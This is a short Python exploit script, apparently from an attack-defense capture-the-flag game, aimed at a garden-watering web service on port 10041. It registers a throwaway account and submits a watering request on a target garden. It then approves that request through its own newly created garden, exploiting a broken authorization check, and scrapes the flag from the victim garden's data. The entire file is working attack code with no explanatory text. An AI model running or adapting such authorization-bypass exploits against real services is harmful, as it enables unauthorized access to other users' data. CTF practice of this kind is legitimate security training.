#!/usr/bin/python3
import random
import re
import string
import sys

import requests


# Approve watering request of admin

def exploit(ip, flag_id):
    s = requests.Session()

    username = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    s.post(f'http://{ip}:10041/registration', params={'username': username, 'password': password})

    # Put watering request for flag id garden
    loc = s.post(f'http://{ip}:10041/gardens/{flag_id}/water', params={'water_available': 123},
                 allow_redirects=False).headers['Location']

    request_id = int(loc[loc.rindex('-') + 1:])

    # Create a garden
    loc = s.post(f'http://{ip}:10041/gardens', params={
        'name': ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16)),
        'latitude': random.randint(-90, 90),
        'longitude': random.randint(-180, 180),
        'water_required': random.randint(1, 10000),
    }, allow_redirects=False).headers['Location']

    garden_id = loc[loc.rindex('/') + 1:]

    # Approve your request
    s.post(f'http://{ip}:10041/gardens/{garden_id}/water/{request_id}')

    # Retrieve flag
    r = s.get(f'http://{ip}:10041/gardens/{flag_id}/water')

    print(re.findall("ECSC_[A-Za-z0-9+/]{32}", r.text))


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.stderr.write('Usage: ./exploit2_1.py IP FLAG_ID\n')
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
